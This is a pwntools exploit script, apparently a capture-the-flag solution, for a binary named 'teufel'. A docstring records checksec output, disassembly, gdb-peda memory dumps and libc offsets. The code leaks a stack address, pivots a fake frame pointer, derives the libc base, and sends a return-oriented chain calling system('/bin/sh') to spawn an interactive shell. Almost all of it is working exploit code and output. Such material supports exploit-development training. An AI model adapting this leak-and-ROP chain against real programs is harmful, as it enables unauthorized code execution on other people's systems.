#!/usr/bin/env python2.7
# coding: UTF-8

from pwn import *

'''
$ checksec.sh --file ./teufel
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      No canary found   NX enabled    Not an ELF file   No RPATH   No RUNPATH   ./teufel

mmap(NULL, 0x3000, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
0000000000400480         mov        edi, 0x0                ; argument "addr" for method j_mmap
0000000000400485         mov        esi, 0x3000             ; argument "len" for method j_mmap
000000000040048a         mov        edx, 0x0                ; argument "prot" for method j_mmap
000000000040048f         mov        ecx, 0x22               ; argument "flags" for method j_mmap
0000000000400494         mov        r8d, 0x0                ; argument "fildes" for method j_mmap
000000000040049a         mov        r9d, 0x0                ; argument "off" for method j_mmap
00000000004004a0         call       j_mmap

mprotect(p+0x1000, 0x1000, PROT_READ | PROT_WRITE) read write only
00000000004004b1         add        rdi, 0x1000             ; argument "addr" for method j_mprotect
00000000004004b8         mov        esi, 0x1000             ; argument "len" for method j_mprotect
00000000004004bd         mov        edx, 0x3                ; argument "prot" for method j_mprotect
00000000004004c2         call       j_mprotect

gdb-peda$ vmmap
0x00007ffff7ff3000 0x00007ffff7ff4000 ---p  mapped
0x00007ffff7ff4000 0x00007ffff7ff5000 rw-p  mapped
0x00007ffff7ff5000 0x00007ffff7ff6000 ---p  mapped

Breakpoint 3, 0x00000000004004f7 in ?? ()
gdb-peda$ telescope
0000| 0x7ffff7ff4fe8 --> 0x0 // input here by read syscall
0008| 0x7ffff7ff4ff0 --> 0x7ffff7ff5000 --> 0x0
0016| 0x7ffff7ff4ff8 --> 0x4004dc (jmp    0x4004d7)
0024| 0x7ffff7ff5000 --> 0x0
0032| 0x7ffff7ff5008 --> 0x0
0040| 0x7ffff7ff5010 --> 0x0
0048| 0x7ffff7ff5018 --> 0x0
0056| 0x7ffff7ff5020 --> 0x0

gdb-peda$ p/d 0x7ffff7ff5000 - 0x7ffff7ff4fe8
$1 = 24 // we only have 24 bytes of play here.

$ ldd ./teufel
    linux-vdso.so.1 =>  (0x00007ffff7ffd000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c1d000)
    /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
$ strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 17c8c3 /bin/sh
$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system
0000000000046590 T __libc_system
000000000012b140 T svcerr_systemerr
0000000000046590 W system

$ rp-lin-x64 -r 1 -f /lib/x86_64-linux-gnu/libc.so.6 --unique | grep 'pop\s\+rdi\s\+;\s\+ret\s'
0x00022b9a: pop rdi ; ret  ;  (506 found)


### strategy ###
infomation leak and ROP
'''

# context.log_level = "debug"

p = process("./teufel")

# Stage 1 - Info leak
p.send(p64(len('a' * 9)))
p.send("a" * 9)
p.recvn(8)

stack_addr = u64(p.recvline()[:-1].ljust(8, "\x00")) & ~0xfff
log.info("Stack is at 0x%x", stack_addr)

# Stage 2
payload = 'a' * 8
payload += p64(stack_addr - 0x900) # fake RBP, the writable space
payload += p64(0x4004ee) # read again.

p.send(p64(len(payload)))
p.send(payload)

libc_base = stack_addr - 0x3d8000
log.info("Libc base is at 0x%x", libc_base)
pop_rdi_ret_addr = libc_base + 0x22b9a
binsh_addr = libc_base + 0x17c8c3
system_addr = libc_base + 0x46590

payload = 'a' * 16
payload += p64(pop_rdi_ret_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(p64(len(payload)))
p.send(payload)

p.recv(1000)
p.interactive()
